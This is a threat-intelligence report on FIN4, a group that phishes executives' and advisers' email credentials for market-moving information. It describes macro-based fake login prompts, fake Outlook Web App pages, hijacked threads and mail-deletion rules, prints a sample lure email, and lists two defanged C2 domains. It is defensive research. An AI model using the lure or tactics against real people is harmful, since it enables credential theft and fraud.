Hacking the Street? FIN4 Likely Playing the Market

F

ireEye is currently tracking a group that
targets the email accounts of individuals
privy to the most confidential information of
more than 100 companies. The group, which we
call FIN4, appears to have a deep familiarity with
business deals and corporate communications, and
their effects on financial markets. Operating since at
least mid-2013, FIN4 distinctly focuses on
compromising the accounts of individuals who
possess non-public information about merger and
acquisition (M&A) deals and major market-moving
announcements, particularly in the healthcare and
pharmaceutical industries. FIN4 has targeted
individuals such as top executives, legal counsel,
outside consultants, and researchers, among others.

We are able to characterize FIN4’s activity from
the incidents to which we have responded in
our clients’ networks, FIN4’s attempts to
compromise our managed service clients, our
product detection data, and further independent
research. Our visibility into FIN4’s activities is
limited to their network operations; we can only
surmise how they may be using and potentially
benefiting from the valuable information they
are able to obtain. However one fact remains
clear: access to insider information that could
make or break stock prices for dozens of publicly
traded companies could surely put FIN4 at a
considerable trading advantage.

FIN4 knows their targets.
Their spearphishing
themes appear to be
written by native
English speakers
familiar with both
investment terminology
and the inner workings
of public companies.

FIN4 uses their
knowledge to craft
convincing phishing lures,
most often sent from
other victims’ email
accounts and through
hijacked email threads.
These lures appeal to
common investor and
shareholder concerns,
enticing the intended
victims into opening the
weaponized document
and entering their email
credentials.

KEY FINDINGS

100+

TARGETS
Since mid-2013, FIN4
has targeted over 100
organizations, all of
which are either publicly
traded companies or
advisory firms that
provide services such as
investor relations, legal
counsel, and investment
banking. Approximately
two-thirds of the
targeted organizations
are healthcare and
pharmaceutical
companies.

FIN4 does not infect
their victims with
malware, but instead
focuses on capturing
usernames and
passwords to victims’
email accounts, allowing
them to view private
email correspondence.

On multiple occasions,
FIN4 has targeted
several parties involved
in a single business
deal, to include law
firms, consultants, and
the public companies
involved in negotiations.
They also have
mechanisms to organize
the data they collect
and have taken steps to
evade detection.

FIN4’S TARGETS

F

ireEye believes FIN4 intentionally targets
individuals who have inside information
about impending market catalysts—events
that will cause the price of stocks to rise or fall
substantially in a short period of time. Since at
least mid-2013, FIN4 has pursued targets at
more than 100 organizations, over two-thirds of
which are public healthcare and pharmaceutical
companies. The remaining targets include
advisory firms that represent public companies
and a handful of public companies in other
sectors closely followed by market watchers.
All but three of the public companies are listed
on the NYSE or NASDAQ, with the remaining
three listed on non-US exchanges.

TARGETED
ORGANIZATIONS:
OVER 100
PUBLICLY TRADED
COMPANIES AND

In order to get useful inside information, FIN4
compromises the email accounts of individuals
who regularly communicate about marketmoving, non-public matters.
FIN4 frequently targets:
• C-level executives and senior leadership
• Legal counsel
• Regulatory, risk, and compliance personnel
• Researchers
• Scientists
• People in other advisory roles

M&A Deals in FIN4’s Crosshairs
FIN4 focuses on acquiring information about
ongoing M&A discussions and identifying the
individuals who are most likely involved. The group
frequently employs M&A-themed and SEC-themed
lures with Visual Basic for Applications (VBA)
macros implemented to steal the usernames and
passwords of these key individuals. Additionally,
FIN4 has included links to fake Outlook Web App
(OWA) login pages designed to capture the user’s
credentials. Once equipped with the credentials,
FIN4 then has access to real-time email
communications—and presumably insight into
potential deals and their timing.
Many of FIN4’s lures appeared to be stolen
documents from actual deal discussions that the
group then weaponized and sent to individuals
directly involved in the deal. In some cases, the
discussions were public knowledge and widely
reported in the media, while others were still in the
early exploration and due diligence phases. In one
instance, we observed FIN4 simultaneously target
five different organizations involved in a single
acquisition discussion. The group targeted
individuals at the five firms several months before
the organizations’ involvement in the acquisition
talks went public.

Lasering in on Healthcare and
Pharmaceuticals
We believe FIN4 heavily targets healthcare and
pharmaceutical companies as stocks in these
industries can move dramatically in response to
news of clinical trial results, regulatory decisions, or
safety and legal issues. In fact, many high-profile
insider trading cases involve the pharmaceutical
sector. We’ve observed FIN4 access information
on a wide variety of issues—including drug
development, insurance reimbursement rates, and
pending legal cases—all of which can significantly
influence the price of healthcare industry stocks.
In one case, FIN4 targeted employees involved in
Medicaid rebates and government purchasing
processes - these issues can heavily influence stock
prices. Healthcare and pharmaceutical companies
depend heavily on the decisions of large third party
payers (like Medicaid) whose purchasing power and
rebate decisions can make or break a company’s
earnings. FIN4 would presumably use this
information to evaluate healthcare companies’
future revenue.

FIN4’s campaign codes illustrate their interest
in the organizations and job roles most likely
to have access to market-moving information
before it goes public.

Keeping it Organized
FIN4 organizes the targets of their activity with
over 70 unique “campaign codes” to designate the
employer of the individuals they target, or in some
cases the generic roles the targeted individuals play
within that organization.
For example:
• CEO_CFO_COO_CORPDEV
• SCIENTISTS_AND_RESEARCH
• <PHARMACEUTICAL COMPANY NAME>
• <ADVISORY FIRM NAME>

Figure 3: Example of FIN4 Campaign Code

These campaign codes function as labels that
FIN4 uses to identify the origin of usernames
and passwords stolen from their targets. These
campaign codes are transmitted to FIN4’s
command and control (C2) servers along with
stolen credentials.

FIN4’S TACTICS

Figure 4: FIN4 phishing email to an executive

Subject: employee making negative comments about you and the
company
From: <name>@<compromised company’s domain>
I noticed that a user named FinanceBull82 (claiming to be an
employee) in an investment discussion forum posted some negative
comments about the company in general (executive compensation
mainly) and you in specific (overpaid and incompetent). He gave
detailed instances of his disagreements, and in doing so, may have
unwittingly divulged confidential company information regarding
pending transactions.

I am a longtime client and I do not think that this will bode well
for future business. The post generated quite a few replies, most
of them agreeing with the negative statements. While I understand
that the employee has the right to his opinion, perhaps he should
have vented his frustrations through the appropriate channels
before making his post. The link to the post is located here (it
is the second one in the thread):

fter identifying a target, FIN4 frequently
embeds VBA macros into a previously
stolen Office document. The embedded
macro displays a dialog box that mimics the
Windows Authentication prompt for the user to
enter their domain credentials. These credentials
are transmitted to a server controlled by the group,
allowing FIN4 to hijack that user’s email account.
FIN4 also sends highly tailored emails that typically
play on the recipient’s knowledge or interest in a
pending deal. In several instances, FIN4 has
included links to fake OWA login pages in their
phishing emails instead (Figure 4). This would be
useful for targeting organizations that may have
disabled VBA macros in Microsoft Office.

FIN4’s Social Engineering
FIN4 knows their audience. Their spearphishing
themes appear to be written by native English
speakers familiar with both investment
terminology and the inner workings of public
companies. FIN4’s phishing emails frequently play
up shareholder and public disclosure concerns.
Figure 4 shows the group’s strong command of an
executive’s concerns over illicit public disclosure,
particularly over executive incompetence and
compensation issues. This email came from an
account that FIN4 hijacked at a public company
and includes several watchwords: “disclosure” of
“confidential company information regarding
pending transactions.” These specific issues are
key terms at public companies, where the public
disclosure of sensitive business information is
strictly regulated.

Figure 5: Generic FIN4 Lure Document

While a large share of FIN4’s lures are previously
stolen confidential company documents, the group
occasionally uses generic lures of interest to the
investment community (Figure 5).
FIN4 also uses existing email threads in a victim’s
inbox to spread their weaponized documents. We’ve
seen the actors seamlessly inject themselves into
email threads. FIN4’s emails would be incredibly
difficult to distinguish from a legitimate email sent
from a previously compromised victim’s email
account. The actors have also Bcc’d all recipients,
making it even more difficult for recipients to
decipher a malicious email from a legitimate one.

A Fly on Many Walls
In several of our investigations, FIN4 targeted
multiple parties involved in a business deal,
including law firms, consultants, and public
companies. In one instance, FIN4 appeared to
leverage its previously-acquired access to email
accounts at an advisory firm (“Advisory Firm A”) to
collect data during a potential acquisition of one of
Advisory Firm A’s clients (“Public Company A”).
FIN4 proceeded to send a spearphishing email
from a compromised account at Advisory Firm A to
another advisory firm (“Advisory Firm B”), who was
also representing Public Company A. FIN4 used a
SEC filing document as a lure. After news of the
possible acquisition was made public, Public
Company A’s stock price varied significantly. It is
likely that FIN4 used the inside information they
had to capitalize on these stock fluctuations.

Figure 6: Outlook rule to filter emails

Evading Detection

Conclusion

FIN4 has been observed creating a rule in victims’
Microsoft Outlook accounts that automatically
deletes any emails that contain words such as
“hacked”, “phish”, “malware”, etc. (Figure 6). The
group likely implements these rules to prevent
compromised victims from receiving replies from
intended targets that their email account may be
compromised, and likely buys FIN4 extra time
before victim organizations detect their activities.

If FIN4’s activities are indeed part of a sustained
effort to gain advance access to market-moving
information, it would not be the first time that
network intrusions have played a role in an insider
trading case. However the scale of FIN4’s
operations, with targets at more than 100 public
companies, coupled with their tactic of going after
key individuals’ emails, sets this group apart.
Our visibility into FIN4 is limited to their network
operations, so we cannot say for certain what
happens after they gain access to insider
information. What we can say is that FIN4’s
network activities must reap enough benefit to
make these operations worth supporting for over a
year—and in fact, FIN4 continues to compromise
new victims as we finish this report.

APPENDIX:
TACTICS

FIN4 employs a simple, yet effective, method to
gather targets’ user credentials through their
spearphishing emails. Using VBA macros, they
embed malicious code into already existing and
legitimate company documents. Embedded in
each Microsoft Word or Excel document is a
malicious macro that prompts the user for their
Outlook credentials. We have also observed this
group send emails with links to fake Outlook Web
App (OWA) login pages that will also steal the
user’s credentials, however we have not observed
this tactic in recent months.

Figure 7: Example of
“Module1” used in
one of the most
recent campaigns

VBA Macros Embedded into
Legitimate Documents
The embedded VBA macro consists of a module
typically entitled “Module1” and a user form that
has been called both “UserForm1” and
“UserLoginForm”. The code in Module1 contains
the information needed to communicate with the
C2 server (Figure 7).

Hacking the Street? FIN4 Likely Playing the Market

Figure 8: Example of “UserForm1” with Campaign Code

The userform contains the code for the user
credentials prompt and an artifact that is highly
indicative of the actors’ targeting. The artifact (a
campaign code) is usually tailored to the particular
target company or the company from which they
are targeting others; alternately, the artifact may
represent a generic role for targeted individuals,
such as SCIENTISTS_AND_RESEARCH or
CEO_CFO_COO_CORPDEV. We have identified
over 70 unique campaign codes to date. This
campaign code is transmitted to the C2 server

along with the victim’s username and password, as
seen in Figure 8.
Many of the fake Outlook windows opened by the
macros contain the logo of the company targeted
giving the pop-up apparent legitimacy. Figure 9
below represents a generic pop-up, with no
company-specific information that a user might
see after opening the document. Only after
credentials are entered will the document appear
for the user.

Networking and Infrastructure
After the user enters data into the username and
password fields, the data is transmitted to the C2
server via a POST request (Figure 10). FIN4 then
uses the collected credentials to login to victim
email accounts. In addition to gaining access to the
victim’s private communications, FIN4 also uses
the compromised accounts to email malicious
documents to additional targets inside and outside
the victim company. The group is currently active
as this report goes to publication and recently
used the domains junomaat81[.]us and
lifehealthsanfrancisco2015[.]com as their C2s.

FIN4 appears to be heavily reliant on Tor (software
that enables users to browse the Internet
anonymously by encrypting their internet traffic
and routing it through servers around the world)
and has been seen using Tor to login to victims’
email accounts after obtaining the compromised
user credentials. We have detected at least two
User Agents that the actors have used and which
can be used to identify potentially suspicious OWA
activity in network logs, when paired with
originating Tor IP addresses.

We have identified nine C2 domains that we
believe were registered by the actors to conduct
these operations. There are also legitimate
domains that appear to have been compromised
and used in previous campaigns in late 2013 and
early 2014; however in the recent months we
have not seen indications that the actor has used
compromised legitimate domains to conduct
their operations.

What Can Network Defenders Do?
The relative simplicity of FIN4’s tactics
(spearphishing, theft of valid credentials, lack
of any malware installed on victim machines)
makes their intrusion activity difficult to detect.
However a few basic security measures can help

14 fireeye.com

thwart the group’s efforts. Disabling VBA macros
in Microsoft Office by default, as well as blocking
the domains listed in Table 1 will help protect
against FIN4’s current activities. Additionally,
enabling two-factor authentication for OWA and
any other remote access mechanisms can help
prevent credentials stolen in this manner from
being leveraged successfully. Companies can also
check their network logs for OWA logins from
known Tor exit nodes if they suspect they are
victimized. Typically, legitimate users do not use
Tor for accessing email. While not conclusive, if
paired with known targeting by this group, the
access from Tor exit nodes can serve as an
indicator of the group’s illicit logins.
